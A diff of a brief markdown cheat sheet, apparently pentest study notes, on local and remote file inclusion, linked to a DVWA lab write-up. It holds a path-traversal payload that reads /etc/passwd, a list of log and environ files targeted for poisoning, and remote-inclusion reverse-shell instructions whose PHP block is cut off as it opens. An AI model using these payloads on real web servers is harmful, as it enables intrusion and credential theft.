@@ -1,17 +1,17 @@
 # File Inclusion
 
 ## Local
-- Exploit
+Exploit
   - Modify ```?page=include.php``` to ```?page=../../../../../etc/passwd```
-- Intersting files
+Intersting files
   - /proc/self/environ
   - /var/log/auth.log
   - /var/log/apache2/access.log  
-- Example
+Example
   - [DVWA](../BuggyApp/DVWA/file-inclusion.md)  
 
 ## Remote
-- Exploit
+Exploit
   - Save the code as *"reverse.txt"*, if extnsion be *"php"*, it will run on kali machine. ? is for run the code in victim machine
 ```php
 <?php
